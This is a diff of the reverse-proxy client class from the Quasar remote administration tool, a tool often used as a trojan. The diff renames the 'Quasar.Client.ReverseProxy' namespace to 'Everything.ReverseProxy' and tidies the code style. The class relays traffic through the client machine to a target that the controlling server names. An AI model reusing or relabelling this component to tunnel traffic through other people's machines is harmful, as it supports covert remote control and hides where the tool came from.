@@ -3,7 +3,7 @@ using System;
 using System.Net;
 using System.Net.Sockets;
 
-namespace Quasar.Client.ReverseProxy
+namespace Everything.ReverseProxy
 {
     public class ReverseProxyClient
     {
@@ -19,30 +19,30 @@ namespace Quasar.Client.ReverseProxy
 
         public ReverseProxyClient(ReverseProxyConnect command, Networking.Client client)
         {
-            this.ConnectionId = command.ConnectionId;
-            this.Target = command.Target;
-            this.Port = command.Port;
-            this.Client = client;
-            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            ConnectionId = command.ConnectionId;
+            Target = command.Target;
+            Port = command.Port;
+            Client = client;
+            Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
             //Non-Blocking connect, so there is no need for a extra thread to create
-            this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
+            Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
         }
 
         private void Handle_Connect(IAsyncResult ar)
         {
             try
             {
-                this.Handle.EndConnect(ar);
+                Handle.EndConnect(ar);
             }
             catch { }
 
-            if (this.Handle.Connected)
+            if (Handle.Connected)
             {
                 try
                 {
-                    this._buffer = new byte[BUFFER_SIZE];
-                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
+                    _buffer = new byte[BUFFER_SIZE];
+                    Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                 }
                 catch
                 {
@@ -57,7 +57,7 @@ namespace Quasar.Client.ReverseProxy
                     Disconnect();
                 }
 
-                IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
+                var localEndPoint = (IPEndPoint)Handle.LocalEndPoint;
                 Client.Send(new ReverseProxyConnectResponse
                 {
                     ConnectionId = ConnectionId,
@@ -86,7 +86,7 @@ namespace Quasar.Client.ReverseProxy
 
             try
             {
-                int received = Handle.EndReceive(ar);
+                var received = Handle.EndReceive(ar);
 
                 if (received <= 0)
                 {
@@ -94,9 +94,9 @@ namespace Quasar.Client.ReverseProxy
                     return;
                 }
 
-                byte[] payload = new byte[received];
+                var payload = new byte[received];
                 Array.Copy(_buffer, payload, received);
-                Client.Send(new ReverseProxyData {ConnectionId = ConnectionId, Data = payload});
+                Client.Send(new ReverseProxyData { ConnectionId = ConnectionId, Data = payload });
             }
             catch
             {
@@ -106,7 +106,7 @@ namespace Quasar.Client.ReverseProxy
 
             try
             {
-                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
+                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
             }
             catch
             {
@@ -121,7 +121,7 @@ namespace Quasar.Client.ReverseProxy
             {
                 _disconnectIsSend = true;
                 //send to the Server we've been disconnected
-                Client.Send(new ReverseProxyDisconnect {ConnectionId = ConnectionId});
+                Client.Send(new ReverseProxyDisconnect { ConnectionId = ConnectionId });
             }
 
             try
@@ -130,7 +130,7 @@ namespace Quasar.Client.ReverseProxy
             }
             catch { }
 
-            Client.RemoveProxyClient(this.ConnectionId);
+            Client.RemoveProxyClient(ConnectionId);
         }
 
         public void SendToTargetServer(byte[] data)
